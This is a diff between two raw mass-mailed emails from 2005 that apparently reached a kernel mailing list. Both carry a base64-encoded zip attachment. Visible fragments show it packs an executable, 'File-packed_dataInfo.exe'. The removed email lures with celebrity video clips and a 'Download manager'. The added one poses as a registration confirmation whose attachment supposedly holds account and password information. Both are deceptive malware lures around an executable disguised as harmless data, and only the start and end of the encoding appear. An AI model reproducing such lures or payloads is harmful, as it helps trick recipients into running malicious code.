@@ -1,30 +1,29 @@
-From: hostmaster@netscape.com
-Subject: Paris Hilton & Nicole Richie
-Date: Thu, 08 Dec 2005 01:13:20 GMT
-Message-ID: <b0f5f3b18af1.9fa@netscape.com>
+From: postman@cygnus.com
+Subject: Registration Confirmation
+Date: Thu, 08 Dec 2005 02:02:03 GMT
+Message-ID: <59b3e50.defc84eb0b2@oss.sgi.com>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="==0f11ff20a6.8bfbf398ff0"
+Content-Type: multipart/mixed; boundary="======6abdce.4cf4c00"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: Z-User@oss.sgi.com
+To: x-Recipient@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---==0f11ff20a6.8bfbf398ff0
+--======6abdce.4cf4c00
 
-The Simple Life:
+Account and Password Information are attached!
 
-View Paris Hilton & Nicole Richie video clips , pictures & more ;)
-Download is free until Jan, 2006!
 
-Please use our Download manager.
---==0f11ff20a6.8bfbf398ff0
-Content-Type: application/octet-stream; name=downloadm.zip
+***** Go to: http://www.cygnus.com
+***** Email: postman@cygnus.com
+--======6abdce.4cf4c00
+Content-Type: application/octet-stream; name=reg_pass-data.zip
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="downloadm.zip"
+Content-Disposition: attachment; filename="reg_pass-data.zip"
 
 UEsDBAoAAAAAAACQdjPMyus3XtgAAF7YAAAYAAAARmlsZS1wYWNrZWRfZGF0YUluZm8uZXhlTVqQ
 AAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -1001,4 +1000,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---==0f11ff20a6.8bfbf398ff0--
+--======6abdce.4cf4c00--
